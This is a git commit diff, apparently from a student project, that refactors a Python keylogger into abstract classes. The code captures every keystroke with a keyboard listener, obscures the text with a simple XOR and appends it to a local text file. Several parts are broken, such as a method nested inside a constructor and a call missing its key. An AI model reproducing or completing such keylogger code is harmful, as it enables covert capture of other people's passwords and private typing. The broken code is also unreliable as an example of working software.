34eb935e1e0c400d8e2c151349ce55ed5e27867c
yoseftaktuk <taktuk07@gmail.com>
2025-08-31 13:14:07 +0300

    תיקון המחלקות בקוד

--- KeyLogger.py
+++ KeyLogger.py
@@ -7,10 +7,53 @@ text = []
 class IKeyLogger(ABC):
     def __init__(self):
         self.text = []
-        self.listener = None
+        
     @abstractmethod
     def start_logging(self):
+        pass
+                          
+    @abstractmethod
+    def stop_logging(self):
+        pass
+
+    @abstractmethod
+    def get_logged_keys(self):
+        pass
         
+
+
+
+#מחלקה שכותבת את המילים המתקבלות לתוך קובץ טקסט
+class IWriter(ABC):
+    @abstractmethod
+    def send_data(self, data: str, machine_name: str):
+        pass
+
+        
+
+#xor מחלקה שמצפינה מילים באמצעות
+class Encryptor:
+    def encryption_using_xor(self,data: list,key):
+        encrypted_text = ''
+        for i, word in enumerate(data):
+            encrypted_text += chr(ord(word) ^ key * i)
+        print (encrypted_text)    
+        return encrypted_text
+    #דוגמא לשימוש בהצפנה
+a = Encryptor()
+b = a.encryption_using_xor('yosef taktuk ashkelon',4) 
+a.encryption_using_xor(b,4)
+
+
+
+class KeyLoggerService(IKeyLogger):
+    def __init__(self):
+        from datetime import datetime
+        import queue
+        self.listener = None
+        super().__init__()
+        self.buf = queue.Queue()
+    def start_logging(self):
         def on_press(key):
             global text
             if key == keyboard.Key.enter:
@@ -31,44 +74,30 @@ class IKeyLogger(ABC):
                 return False
             else:
                 self.text.append(key)
-                print(text)
-            
+                print(self.text)
         with keyboard.Listener(
-            on_press=on_press) as listener:
-            listener.join()    
-                          
-    @abstractmethod
-    def stop_logging(self):
-        if self.listener:
-            self.listener.stop()
+            on_press=on_press) as self.listener:
+            self.listener.join()       
 
-    @abstractmethod
+    def stop_logging(self):
+        if self.start_logging:
+            self.listener.stop() 
     def get_logged_keys(self):
         return self.text
-        
 
-
-
-#מחלקה שכותבת את המילים המתקבלות לתוך קובץ טקסט
-class IWriter(ABC):
-    @abstractmethod
-    def send_data(self, data: str, machine_name: str):
-        for i in data:
-            text += i
+class FileWriter(IWriter):
+    def __init__(self):
+        super().__init__()
+        Encryption = Encryptor()
+        def send_data(self, data: str, machine_name: str):
+            for i in data:
+                text += Encryption.encryption_using_xor(i)
         with open('text.txt','a') as file:
             file.write(text)
-        
 
-#xor מחלקה שמצפינה מילים באצעות
-class Encryptor:
-    def encryption_using_xor(self,data: list,key):
-        encrypted_text = ''
-        key_length = len(data)
-        for i, word in enumerate(data):
-            encrypted_text += chr(ord(word) ^ key)
-        print (encrypted_text)    
-        return encrypted_text
-    #דוגמא לשימוש בהצפנה
-# a = Encryptor()
-# b = a.encryption_using_xor('yosef taktuk ashkelon',4) 
-# a.encryption_using_xor(b,4)
+                     
+
+# a = KeyLoggerService()
+
+# b = FileWriter()
+# b.send_data()
